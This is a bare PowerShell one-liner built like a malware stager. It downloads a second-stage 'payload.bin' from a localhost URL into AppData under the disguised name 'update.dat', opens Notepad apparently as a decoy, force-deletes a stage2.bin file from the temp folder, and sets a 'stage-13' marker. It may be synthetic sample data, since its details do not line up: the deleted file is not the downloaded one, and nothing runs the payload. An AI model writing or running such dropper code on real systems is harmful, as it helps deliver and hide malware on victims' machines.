
$Stage2Url = "https://localhost:8000/payload.bin"; $DropPath = "$env:APPDATA\update.dat"; (New-Object System.Net.WebClient).DownloadFile($Stage2Url, $DropPath); Start-Process -FilePath 'notepad.exe'; Remove-Item -Path "$env:TEMP\stage2.bin" -Force; $StageMarker = "stage-13"
